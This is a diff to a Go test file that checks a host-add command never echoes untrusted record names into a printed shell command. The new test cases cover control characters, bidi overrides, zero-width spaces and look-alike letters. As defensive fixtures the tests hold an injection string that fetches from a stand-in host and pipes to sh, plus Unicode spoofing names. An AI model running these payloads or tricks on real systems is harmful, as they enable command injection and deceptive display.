@@ -282,9 +282,10 @@ func TestHostAdd_ARecentInstallIsJudgedByTheCertificateInstalled(t *testing.T) {
 // command, which sh splits into exactly that command and which runs nothing
 // else.
 //
-// Mutations: accept any record name — the control-character record is
-// echoed; shellWord returns its input — the metacharacter name splits and
-// runs.
+// Mutations: echo any name lv host rm takes (settleName, not echoableName)
+// — the look-alike letter is echoed; with addRecords' and settleName's
+// printable checks also gone, every non-ASCII and control case is;
+// shellWord returns its input — the metacharacter name splits and runs.
 func TestHostAdd_AMachinesTextNeverReachesAPrintedCommand(t *testing.T) {
 	const evil = "x;curl${IFS}evil.example|sh;#"
 	t.Run("an attempt record", func(t *testing.T) {
@@ -315,21 +316,32 @@ func TestHostAdd_AMachinesTextNeverReachesAPrintedCommand(t *testing.T) {
 			t.Errorf("admitted %v, events %v", f.client.admitted, f.target.Events)
 		}
 	})
-	t.Run("an attempt record that does not print safely", func(t *testing.T) {
-		f := newAddFixture(t)
-		installPair(t, f, "", "foreign")
-		if err := os.WriteFile(filepath.Join(f.targetPKI, ".host.crt.add-abc-0123456789ab.before"),
-			[]byte("x\x1b[2Jcurl -\n"), 0o600); err != nil {
-			t.Fatal(err)
-		}
-		err := f.add(t)
-		if err == nil || strings.Contains(err.Error(), "curl") || strings.Contains(err.Error(), "lv host rm") {
-			t.Fatalf("add = %v, want a refusal that does not echo the record", err)
-		}
-		if reachedInstall(f.target.Events) || len(f.client.admitted) != 0 {
-			t.Errorf("admitted %v, events %v", f.client.admitted, f.target.Events)
-		}
-	})
+	// A name echoed only when every byte is printable ASCII: a control
+	// character, a bidi override (U+202E), a zero-width space (U+200B) or a
+	// look-alike letter (Cyrillic U+043E) could make the command shown differ
+	// from the one that runs, so none is printed, nor a command with it.
+	for _, tc := range []struct{ what, name string }{
+		{"a control character", "x\x1b[2Jcurl"},
+		{"a bidi override", "node\u202e9-curl"},
+		{"a zero-width space", "node\u200b-9curl"},
+		{"a look-alike letter", "n\u043ede-9curl"},
+	} {
+		t.Run("an attempt record with "+tc.what, func(t *testing.T) {
+			f := newAddFixture(t)
+			installPair(t, f, "", "foreign")
+			if err := os.WriteFile(filepath.Join(f.targetPKI, ".host.crt.add-abc-0123456789ab.before"),
+				[]byte(tc.name+" -\n"), 0o600); err != nil {
+				t.Fatal(err)
+			}
+			err := f.add(t)
+			if err == nil || strings.Contains(err.Error(), "curl") || strings.Contains(err.Error(), "lv host rm") {
+				t.Fatalf("add = %v, want a refusal that does not echo the record", err)
+			}
+			if reachedInstall(f.target.Events) || len(f.client.admitted) != 0 {
+				t.Errorf("admitted %v, events %v", f.client.admitted, f.target.Events)
+			}
+		})
+	}
 	t.Run("an install record", func(t *testing.T) {
 		f := newAddFixture(t)
 		writeMarker(t, f.target, fmt.Sprintf("%s %s %d %s installing\n", evil, evil, time.Now().Unix(), evil))
